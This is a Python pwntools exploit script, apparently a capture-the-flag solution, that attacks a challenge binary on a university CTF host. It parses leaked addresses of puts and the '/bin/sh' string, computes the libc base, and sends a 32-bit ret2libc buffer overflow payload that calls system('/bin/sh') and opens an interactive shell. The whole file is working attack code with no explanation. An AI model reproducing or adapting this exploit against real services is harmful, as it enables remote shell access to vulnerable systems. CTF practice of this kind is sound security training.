#!/usr/bin/python3

from pwn import *

def setup_connection(target, port):
    return remote(target, port)

def setup_binary(binary_name):
    context.binary = ELF(binary_name)
    return context.binary

def setup_libc(libc_version):
    return ELF(libc_version)

def fetch_addresses(connection):
    connection.recvuntil(b"string /bin/sh: ")
    binsh = int(connection.recvline().strip(), 16)
    log.info("binsh: %#x", binsh)

    connection.recvuntil(b"puts: ")
    puts = int(connection.recvline().strip(), 16)

    return binsh, puts

def calculate_libc_base(libc, puts):
    libc.address = puts - libc.sym.puts
    log.info("libc: %#x", libc.address)

def construct_payload(libc, binsh, padding_length=20):
    return b"A" * padding_length + p32(libc.sym.system) + p32(0xDEADBEEF) + p32(binsh)

def send_payload(connection, payload):
    connection.sendline(payload)

def interactive_mode(connection):
    connection.interactive()

if __name__ == "__main__":
    target = "ctf99.cs.ui.ac.id"
    port = 10017
    binary_name = 'chall'
    libc_version = "libc-2.27.so"

    connection = setup_connection(target, port)
    elf = setup_binary(binary_name)
    libc = setup_libc(libc_version)
    
    binsh, puts = fetch_addresses(connection)
    calculate_libc_base(libc, puts)

    payload = construct_payload(libc, binsh)
    send_payload(connection, payload)
    
    interactive_mode(connection)
